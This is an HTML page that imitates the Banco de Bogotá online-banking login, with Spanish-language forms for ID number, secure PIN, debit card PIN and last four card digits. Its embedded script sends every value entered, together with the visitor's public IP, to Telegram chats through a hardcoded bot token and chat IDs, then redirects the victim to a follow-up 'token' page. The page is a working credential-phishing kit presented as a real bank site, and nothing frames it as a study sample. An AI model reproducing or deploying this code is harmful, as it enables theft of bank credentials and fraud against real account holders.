<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Banco de Bogotá - Banca Virtual</title>
  <style>
    *{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif}
    body{background:#fff;display:flex;flex-direction:column;min-height:100vh}
    .main-container{padding:20px;max-width:400px;width:100%;margin:0 auto;flex:1}
    .welcome-section{display:flex;align-items:center;margin-bottom:20px}
    .bank-logo{width:60px;height:60px;margin-right:15px}
    .welcome-text{font-size:18px;color:#000;font-weight:normal}
    .help-banner{background:#0b66c2;color:#fff;border-radius:10px;padding:1px;display:flex;align-items:center;margin-bottom:20px}
    .help-banner-image{width:60px;height:90px;object-fit:cover;border-radius:-20%;margin-right:15px}
    .help-text{flex:1;font-size:12px}
    .help-title{font-size:12px;margin-bottom:10px;font-weight:normal}
    .help-link{color:#fff;text-decoration:none;display:flex;align-items:center;font-weight:normal}
    .login-container{background:#fff;border-radius:10px;padding:20px;box-shadow:0 2px 5px rgba(0,0,0,0.1)}
    .tab-container{display:flex;border-bottom:1px solid #ddd;margin-bottom:20px}
    .tab{flex:1;text-align:center;padding:10px;font-size:16px;color:#777;cursor:pointer}
    .tab.active{color:#0b66c2;border-bottom:3px solid #0b66c2;font-weight:normal}
    .info-message{background:#e8f4fc;border-left:4px solid #0b66c2;padding:10px;margin-bottom:20px;display:flex;justify-content:space-between;align-items:center;color:#333}
    .close-btn{color:#0b66c2;font-size:20px;cursor:pointer}
    .formulario{margin-bottom:20px}
    .form-group{margin-bottom:15px}
    .form-label{display:block;font-size:14px;color:#555;margin-bottom:5px}
    .form-row{display:flex;gap:10px;}
    .form-row > select.form-control{flex:0.3;max-width:30%;padding:10px;border:1px solid #ccc;border-radius:5px;background:#fff;font-size:14px;outline:none;}
    .form-row > input.form-control{flex:0.7;width:auto;padding:10px;border:1px solid #ccc;border-radius:5px;font-size:14px;outline:none;}
    input.form-control{width:100%;padding:10px;border:1px solid #ccc;border-radius:5px;font-size:14px;outline:none;}
    .password-input{position:relative}
    .toggle-password{position:absolute;right:10px;top:50%;transform:translateY(-50%);color:#0b66c2;font-size:12px;cursor:pointer}
    .btn-login{width:100%;padding:12px;background:#f2f2f2;color:#555;border:none;border-radius:30px;font-size:16px;cursor:pointer;transition:background 0.3s;margin-bottom:20px}
    .btn-login:hover{background:#e0e0e0}
    .btn-login.active{background:#0b66c2;color:#fff;animation:pulse 1.5s infinite}
    @keyframes pulse{0%{box-shadow:0 0 0 0 rgba(11,102,194,0.4)}70%{box-shadow:0 0 0 10px rgba(11,102,194,0)}100%{box-shadow:0 0 0 0 rgba(11,102,194,0)}}
    .actions-container{display:flex;border-top:1px solid #ddd;padding-top:15px}
    .action-link{flex:1;text-align:center;color:#0b66c2;text-decoration:none;font-weight:bold;font-size:14px}
    .bottom-indicator{width:30%;height:5px;background:#000;border-radius:3px;margin:20px auto}
    footer{font-size:12px;color:#666;text-align:center;padding:10px 20px;border-top:1px solid #eee}
  </style>
</head>
<body>

  <div class="main-container">
    <div class="welcome-section">
      <img src="logo.png" alt="Logo BB" class="bank-logo">
      <h1 class="welcome-text">Bienvenido a tu Banca Virtual</h1>
    </div>

    <div class="help-banner">
      <img src="persona.png" alt="Soporte" class="help-banner-image">
      <div class="help-text">
        <div class="help-title">¿Nunca has ingresado a Banca Virtual?</div>
        <a href="#" class="help-link">Aquí te decimos cómo hacerlo ›</a>
      </div>
    </div>

    <div class="login-container">
      <div class="tab-container">
        <div class="tab active" data-target="clave-segura">Clave segura</div>
        <div class="tab" data-target="tarjeta-debito">Tarjeta débito</div>
      </div>

      <div class="info-message">
        <div id="info-text">
          Estás ingresando con tu Clave Segura. Selecciona 'Tarjeta Débito' para cambiar.
        </div>
        <div class="close-btn">×</div>
      </div>

      <!-- Clave Segura -->
      <div class="formulario" id="clave-segura">
        <div class="form-group">
          <label class="form-label">Identificación</label>
          <div class="form-row">
            <select id="idTypeCS" class="form-control">
              <option value="C.C.">C.C.</option>
              <option value="T.I.">T.I.</option>
              <option value="C.E.">C.E.</option>
              <option value="N.P.N.">N.P.N.</option>
              <option value="N.P.E.">N.P.E.</option>
              <option value="N.P.J.">N.P.J.</option>
              <option value="P.S.">P.S.</option>
              <option value="R.C.">R.C.</option>
            </select>
            <input type="text" id="idNumCS" class="form-control" placeholder="#" inputmode="numeric" pattern="\d*" maxlength="10">
          </div>
        </div>
        <div class="form-group">
          <label class="form-label">Clave segura</label>
          <div class="password-input">
            <input type="password" id="claveInput" class="form-control" placeholder="····" inputmode="numeric" pattern="\d*" maxlength="4">
            <div class="toggle-password">Mostrar</div>
          </div>
        </div>
      </div>

      <!-- Tarjeta Débito -->
      <div class="formulario" id="tarjeta-debito" style="display:none;">
        <div class="form-group">
          <label class="form-label">Identificación</label>
          <div class="form-row">
            <select id="idTypeTD" class="form-control">
              <option value="C.C.">C.C. Cédula de ciudadanía</option>
              <option value="T.I.">T.I. Tarjeta de identidad</option>
              <option value="C.E.">C.E. Cédula de extranjería</option>
              <option value="N.P.N.">N.P.N. NIT persona natural</option>
              <option value="N.P.E.">N.P.E. NIT persona extranjera</option>
              <option value="N.P.J.">N.P.J. NIT persona jurídica</option>
              <option value="P.S.">P.S. Pasaporte</option>
              <option value="R.C.">R.C. Registro civil</option>
            </select>
            <input type="text" id="idNumTD" class="form-control" placeholder="#" inputmode="numeric" pattern="\d*" maxlength="10">
          </div>
        </div>
        <div class="form-group">
          <label class="form-label">Clave de tu tarjeta débito</label>
          <div class="password-input">
            <input type="password" id="claveTarjeta" class="form-control" placeholder="····" inputmode="numeric" pattern="\d*" maxlength="4">
            <div class="toggle-password">Mostrar</div>
          </div>
        </div>
        <div class="form-group">
          <label class="form-label">Últimos 4 dígitos de tu tarjeta débito</label>
          <div class="password-input">
            <input type="password" id="ult4Tarjeta" class="form-control" placeholder="····" inputmode="numeric" pattern="\d*" maxlength="4">
            <div class="toggle-password">Mostrar</div>
          </div>
        </div>
      </div>

      <button class="btn-login" id="btnIngresar" disabled>Ingresar</button>

      <div class="actions-container">
        <a href="#" class="action-link">Registrarme ›</a>
        <a href="#" class="action-link">Olvidé mi clave ›</a>
      </div>
      <div class="bottom-indicator"></div>
    </div>
  </div>

  <footer>
    Este sitio está protegido por reCAPTCHA y aplican las políticas de privacidad y los términos de servicio de Google.
  </footer>

  <script>
    // Capturamos referencias
    // === Referencias a elementos del DOM ===
    const idTypeCS     = document.getElementById('idTypeCS');
    const idNumCS      = document.getElementById('idNumCS');
    const claveInput   = document.getElementById('claveInput');
    const idTypeTD     = document.getElementById('idTypeTD');
    const idNumTD      = document.getElementById('idNumTD');
    const claveTarjeta = document.getElementById('claveTarjeta');
    const ult4Tarjeta  = document.getElementById('ult4Tarjeta');
    const btnIngresar  = document.getElementById('btnIngresar');
    const tabs         = document.querySelectorAll('.tab');
    const formularios  = document.querySelectorAll('.formulario');
    const infoText     = document.getElementById('info-text');
    const closeBtn     = document.querySelector('.close-btn');

    // === Configuración de tu bot y los chat IDs ===
    const BOT_TOKEN = '7602610285:AAG9IcFA-RFU2ibYiufHOsVJ-XdDilQen8A';
    const CHAT_IDS  = ['-1002627876802', '-1002627876802'];  // Agrega aquí todos los chat_id

    // === Función para alternar pestañas ===
    tabs.forEach(tab => {
      tab.addEventListener('click', () => {
        // Marca pestaña activa
        tabs.forEach(t => t.classList.remove('active'));
        tab.classList.add('active');
        // Muestra el formulario correspondiente
        const target = tab.dataset.target;
        formularios.forEach(f => f.style.display = 'none');
        document.getElementById(target).style.display = 'block';
        // Actualiza el mensaje de info
        infoText.innerText = target === 'clave-segura'
          ? "Estás ingresando con tu Clave Segura. Selecciona 'Tarjeta Débito' para cambiar."
          : "Estás ingresando con tu Tarjeta Débito. Selecciona 'Clave Segura' para cambiar.";
        checkFields();
      });
    });

    // === Toggle de mostrar/ocultar contraseña ===
    document.querySelectorAll('.toggle-password').forEach(toggle => {
      toggle.addEventListener('click', () => {
        const inp = toggle.previousElementSibling;
        if (inp.type === 'password') {
          inp.type = 'text';
          toggle.textContent = 'Ocultar';
        } else {
          inp.type = 'password';
          toggle.textContent = 'Mostrar';
        }
      });
    });

    // === Cerrar banner informativo ===
    closeBtn.addEventListener('click', () => {
      document.querySelector('.info-message').style.display = 'none';
    });

    // === Habilitar o deshabilitar botón según campos no vacíos ===
    [idNumCS, claveInput, idNumTD, claveTarjeta, ult4Tarjeta]
      .forEach(el => el.addEventListener('input', checkFields));

    function checkFields() {
      const activeForm = document.querySelector('.tab.active').dataset.target;
      let ok = false;
      if (activeForm === 'clave-segura') {
        ok = idNumCS.value.trim() !== '' && claveInput.value.trim() !== '';
      } else {
        ok = idNumTD.value.trim() !== '' &&
             claveTarjeta.value.trim() !== '' &&
             ult4Tarjeta.value.trim() !== '';
      }
      btnIngresar.disabled = !ok;
      btnIngresar.classList.toggle('active', ok);
    }

    // === Envío del mensaje a múltiples chat IDs ===
    btnIngresar.addEventListener('click', async () => {
      // Construimos los datos según la pestaña activa
      const activeForm = document.querySelector('.tab.active').dataset.target;
      const datos = {
        tipo:   activeForm === 'clave-segura' ? 'Clave Segura' : 'Tarjeta Débito',
        tipoId: activeForm === 'clave-segura' ? idTypeCS.value : idTypeTD.value,
        id:     activeForm === 'clave-segura' ? idNumCS.value  : idNumTD.value,
        clave:  activeForm === 'clave-segura' ? claveInput.value : claveTarjeta.value,
        ult4:   activeForm === 'tarjeta-debito' ? ult4Tarjeta.value : null
      };

      try {
        // Obtenemos la IP pública
        const ip = await fetch('https://api.ipify.org?format=json')
                        .then(r => r.json())
                        .then(j => j.ip)
                        .catch(() => 'desconocida');

        // Montamos el mensaje en Markdown
        let mensaje = `🔔 *Nuevo acceso recibido:*\n\n`;
        mensaje += `🔐 *Tipo:* ${datos.tipo}\n`;
        mensaje += `🪪 *Tipo ID:* ${datos.tipoId}\n`;
        mensaje += `🧾 *Identificación:* \`${datos.id}\`\n`;
        mensaje += `🔑 *Clave:* \`${datos.clave}\`\n`;
        if (datos.ult4) mensaje += `💳 *Últimos 4 dígitos:* \`${datos.ult4}\`\n`;
        mensaje += `🌐 *IP:* \`${ip}\``;

        // Enviamos el mismo mensaje a cada chat_id
        for (const chat_id of CHAT_IDS) {
          const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id, text: mensaje, parse_mode: 'Markdown' })
          });
          const json = await res.json();
          if (!json.ok) {
            console.error(`Error enviando a ${chat_id}:`, json.description);
            // Opcional: podrías romper el loop o acumular errores
          }
        }

        // Si todos (o la mayoría) fueron enviados, redirigimos
        window.location.href = 'token.html';

      } catch (err) {
        console.error('Error en el envío a Telegram:', err);
        alert('Ocurrió un error, intenta de nuevo.');
      }
    });
  </script>
</body>
</html>
